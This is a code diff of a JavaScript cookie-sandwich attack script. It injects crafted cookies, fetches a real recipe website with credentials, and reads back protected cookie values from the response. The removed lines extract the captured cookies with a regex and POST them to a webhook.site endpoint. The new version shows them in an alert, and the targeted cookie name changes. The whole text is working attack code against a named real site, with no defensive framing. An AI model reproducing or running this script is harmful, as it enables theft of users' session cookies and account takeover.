@@ -1,4 +1,4 @@
-    async function sandwich(target, cookie) {
+async function sandwich(target, cookie) {
     // Step 1: Create an iframe with target src and wait for it
     const iframe = document.createElement('iframe');
 
@@ -17,26 +17,17 @@
         document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`;
         document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;
         // Step 3: Send a fetch request
-        
+        try {
             const response = await fetch(`${target}`, {
                 credentials: 'include',
             });
-            const regexf = /deadbeef([\s\S]*?)dummy/g;
             const responseData = await response.text();
-            var result = responseData.match(regexf);
-            const resultado = result.join(" ")
-            // Step 4: Alert respone
-            const x2 = await fetch("https://webhook.site/49c9cc9e-5da5-400e-8342-54b339a0a24a/", {
-              method: "POST",
-              mode: 'no-cors',
-              headers: {
-                "Content-Type": "application/json"
-              },
-      // Enviando o texto no campo 'mensagem' do body
-            body: JSON.stringify({ cookies: resultado })
-            });
-            alert(responseData); 
-    }
+            // Step 4: Alert response
+            alert(responseData);
+        } catch (error) {
+            console.error('Error fetching data:', error);
+        }
+    };
 }
 
-setTimeout(sandwich, 100, 'https://www.allrecipes.com/entertaining/', 'Mint');
+setTimeout(sandwich, 100, 'https://www.allrecipes.com/entertaining/', 'hid');
